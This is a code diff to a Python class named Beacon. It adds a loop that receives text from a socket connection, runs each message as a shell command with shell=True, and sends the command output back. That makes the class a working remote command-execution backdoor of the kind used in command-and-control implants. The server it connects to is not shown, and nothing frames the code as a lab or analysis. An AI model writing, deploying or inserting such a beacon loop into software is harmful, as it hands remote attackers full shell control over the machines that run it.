@@ -19,8 +19,19 @@ class Beacon:
       self.running = True
       self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       self.connect()
-      while self.running == True:
-         pass
+      while self.running:
+            self.sock.settimeout(5)
+            try:
+               data = self.sock.recv(1024).decode()
+               if not data:
+                  # If no data is received, break the loop
+                  break
+               print("Received:",data)
+               ps = subprocess.run(data, shell=True, capture_output=True)
+               print("Sending:" ,ps.stdout)
+               self.sock.send(ps.stdout)
+            except socket.timeout:
+                continue
 
    def terminate(self):
       self.running = False
